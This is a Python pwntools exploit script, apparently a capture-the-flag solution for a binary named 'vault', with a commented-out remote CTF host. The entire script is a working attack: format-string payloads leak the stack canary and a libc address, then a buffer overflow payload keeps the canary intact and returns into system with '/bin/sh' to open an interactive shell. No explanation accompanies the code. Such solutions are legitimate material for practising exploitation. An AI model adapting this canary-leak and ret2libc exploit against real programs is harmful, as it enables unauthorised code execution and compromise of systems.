from pwn import *
p=process('./vault')
#p=remote('play.scriptsorcerers.xyz', 10489)

p.sendline(b'1')
p.sendline(b'%23$p')
p.sendline(b'2')
sleep(1)
print(p.recv().decode())

p.sendline(b'1')
p.sendline(b'%9$p')
p.sendline(b'2')
sleep(1)
print(p.recv().decode())

canary=int(input('canary: '),16)
libc=int(input('libc: '),16)
system=libc-202640
binsh=libc+1324194

payload=b'a'*64+p32(canary)+b'aaaa'+b'bbbb'+b'cccc'+p32(system)+p32(0)+p32(binsh)
p.sendline(b'1')
p.sendline(payload)
p.sendline(b'3')
p.interactive()
